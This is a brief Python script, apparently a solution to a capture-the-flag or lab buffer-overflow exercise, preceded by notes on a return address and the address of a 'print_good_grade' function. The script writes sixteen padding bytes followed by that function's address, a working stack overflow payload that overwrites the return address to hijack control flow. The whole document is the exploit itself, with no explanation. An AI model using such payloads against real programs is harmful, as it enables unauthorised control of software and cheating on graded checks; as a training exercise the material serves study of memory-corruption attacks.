"""
return address: 0x08048c8e

print_good_grade:start address:0x08048c23

 0x08048c70

"""
import sys

sys.stdout.buffer.write(b'A'*16)
sys.stdout.buffer.write(0x08048c23.to_bytes(4,'little'))